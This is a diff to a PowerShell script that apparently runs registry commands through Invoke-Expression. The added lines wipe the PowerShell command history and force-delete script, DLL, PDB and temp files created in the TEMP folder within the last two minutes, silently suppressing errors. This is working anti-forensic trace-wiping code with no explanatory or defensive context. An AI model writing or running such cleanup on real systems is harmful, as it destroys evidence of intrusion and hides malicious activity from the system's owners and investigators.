@@ -26,6 +26,26 @@ Invoke-Expression $regCommand3 | Out-Null
 Invoke-Expression $regCommand4 | Out-Null
 
 
+Clear-History -Force
+$hp = (Get-PSReadlineOption).HistorySavePath
+if (Test-Path $hp) {
+    try {
+        # ফাইলটি খোলা থাকলে রিলিজ করার চেষ্টা
+        [System.GC]::Collect()
+        [System.GC]::WaitForPendingFinalizers()
+        Clear-Content -Path $hp -Force -ErrorAction SilentlyContinue
+        # ফাইলটি খালি কন্টেন্ট দিয়ে ওভাররাইট
+        Set-Content -Path $hp -Value $null -Force -ErrorAction SilentlyContinue
+    } catch {}
+}
+
+# টেম্প ফাইল ক্লিয়ার (গত ২ মিনিটের মধ্যে ক্রিয়েটেড)
+Get-ChildItem -Path $env:TEMP -Filter "*.cs" -File | Where-Object { $_.CreationTime -gt (Get-Date).AddMinutes(-2) } | Remove-Item -Force -ErrorAction SilentlyContinue
+Get-ChildItem -Path $env:TEMP -Filter "*.dll" -File | Where-Object { $_.CreationTime -gt (Get-Date).AddMinutes(-2) } | Remove-Item -Force -ErrorAction SilentlyContinue
+Get-ChildItem -Path $env:TEMP -Filter "*.pdb" -File | Where-Object { $_.CreationTime -gt (Get-Date).AddMinutes(-2) } | Remove-Item -Force -ErrorAction SilentlyContinue
+Get-ChildItem -Path $env:TEMP -Filter "*.tmp" -File | Where-Object { $_.CreationTime -gt (Get-Date).AddMinutes(-2) } | Remove-Item -Force -ErrorAction SilentlyContinue
+
+Get-ChildItem -Path $env:TEMP -Filter "*.ps1" -File | Where-Object { $_.CreationTime -gt (Get-Date).AddMinutes(-2) } | Remove-Item -Force -ErrorAction SilentlyContinue
 
 
 Set-StrictMode -Version Latest
@@ -134,6 +154,7 @@ $historyPath = [System.IO.Path]::Combine(
     $env:APPDATA,
     'Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt'
 )
+
 if (Test-Path $historyPath) {
     Set-Content -Path $historyPath -Value $null -Force -ErrorAction SilentlyContinue
 } else {
